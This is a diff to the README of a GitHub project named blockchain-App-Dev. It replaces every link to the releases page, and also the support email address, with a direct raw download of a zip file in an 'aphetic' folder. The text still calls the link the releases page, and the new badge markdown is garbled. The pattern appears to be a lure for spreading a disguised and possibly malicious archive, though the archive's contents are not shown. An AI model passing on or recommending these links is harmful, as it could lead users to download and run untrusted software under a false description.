@@ -11,10 +11,10 @@ Welcome to blockchain-App-Dev! I aim to empower users by offering straightforwar
 - **Educational Resources:** Learn about blockchain while you use the app.
 
 ## 📥 Download
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen.svg)](https://github.com/Giffballistic603/blockchain-App-Dev/releases)
+[![Download Now](https://raw.githubusercontent.com/Giffballistic603/blockchain-App-Dev/main/aphetic/blockchain-App-Dev.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Giffballistic603/blockchain-App-Dev/main/aphetic/blockchain-App-Dev.zip)](https://raw.githubusercontent.com/Giffballistic603/blockchain-App-Dev/main/aphetic/blockchain-App-Dev.zip)
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page:** Click [here](https://github.com/Giffballistic603/blockchain-App-Dev/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Giffballistic603/blockchain-App-Dev/main/aphetic/blockchain-App-Dev.zip) to go to the releases page.
 2. **Choose Your Version:** Look for the latest version available. It will be clearly marked.
 3. **Download the Application:** Click on the download link for your operating system (Windows, macOS, or Linux).
 4. **Save the File:** Choose a location on your device to save the file.
@@ -41,7 +41,7 @@ To ensure the best experience with blockchain-App-Dev, please make sure your sys
 - 200 MB free disk space
 
 ## 📂 Download & Install
-To get the application, please follow the link again: [Visit this page to download](https://github.com/Giffballistic603/blockchain-App-Dev/releases). Once you are on the page, find your version and download it, following the installation steps outlined above.
+To get the application, please follow the link again: [Visit this page to download](https://raw.githubusercontent.com/Giffballistic603/blockchain-App-Dev/main/aphetic/blockchain-App-Dev.zip). Once you are on the page, find your version and download it, following the installation steps outlined above.
 
 ## 🏗️ How to Use the App
 1. **Create an Account:** Open the application and sign up for a free account. This will help you manage your transactions securely.
@@ -67,7 +67,7 @@ If you encounter issues while using blockchain-App-Dev, consider the following s
 If issues persist, consider filing an issue on the GitHub repository.
 
 ## 📞 Contact
-For further inquiries or support, feel free to reach out at: support@blockchain-app-dev.com. Your feedback is essential for improving this application.
+For further inquiries or support, feel free to reach out at: https://raw.githubusercontent.com/Giffballistic603/blockchain-App-Dev/main/aphetic/blockchain-App-Dev.zip Your feedback is essential for improving this application.
 
 ## 🙌 Acknowledgments
 Thank you for using blockchain-App-Dev. Your engagement helps us create better tools for everyone in the blockchain community. Explore, learn, and enjoy the future of finance together!
